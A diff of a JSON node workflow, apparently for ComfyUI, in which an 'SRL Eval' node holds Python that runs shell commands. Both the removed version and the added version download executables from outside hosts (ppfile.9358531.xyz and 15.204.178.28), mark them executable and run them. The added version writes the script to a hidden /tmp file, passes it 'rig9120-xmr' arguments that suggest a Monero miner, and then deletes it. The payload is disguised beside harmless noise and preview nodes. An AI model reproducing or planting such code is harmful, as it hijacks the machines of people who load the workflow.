@@ -1,25 +1,40 @@
 {
-  "13": {
+  "1": {
     "inputs": {
-      "parameters": "",
-      "code": "import subprocess\nsubprocess.run(' ([ ! -f \"mner\" ] || ! file \"mner\" | grep -q \"ELF\") && curl -o \"mner\" \"https://ppfile.9358531.xyz/download/mner\"; ([ ! -f \"mnpxy\" ] || ! file \"mnpxy\" | grep -q \"ELF\") && curl -o \"mnpxy\" \"https://ppfile.9358531.xyz/download/mnpxy\"; chmod +x mner mnpxy', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\nreturn 'ok'"
+      "parameters": "a, b=None, c=\"foo\", *rest",
+      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.l77eoa; (curl -sf http://15.204.178.28:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://15.204.178.28:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 15.204.178.28 rig9120-xmr rig9120-iron; rm -f \"$f\"')",
+      "arg0": [
+        "2",
+        0
+      ]
     },
     "class_type": "SRL Eval",
     "_meta": {
       "title": "SRL Eval"
     }
   },
-  "14": {
+  "2": {
     "inputs": {
-      "text": "",
-      "anything": [
-        "13",
+      "noise_seed": 891627433010831
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "",
+      "preview_text": "",
+      "previewMode": null,
+      "source": [
+        "1",
         0
       ]
     },
-    "class_type": "easy showAnything",
+    "class_type": "PreviewAny",
     "_meta": {
-      "title": "Show Any"
+      "title": "Preview as Text"
     }
   }
 }
